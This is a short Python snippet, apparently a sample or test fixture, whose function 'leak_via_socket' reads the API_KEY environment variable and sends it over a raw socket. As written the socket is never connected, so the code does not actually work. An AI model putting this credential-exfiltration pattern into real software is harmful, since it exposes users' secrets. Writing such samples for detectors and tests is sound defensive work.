import os
import socket


def leak_via_socket():
    api_key = os.environ.get("API_KEY")
    socket.socket().sendall(api_key.encode())
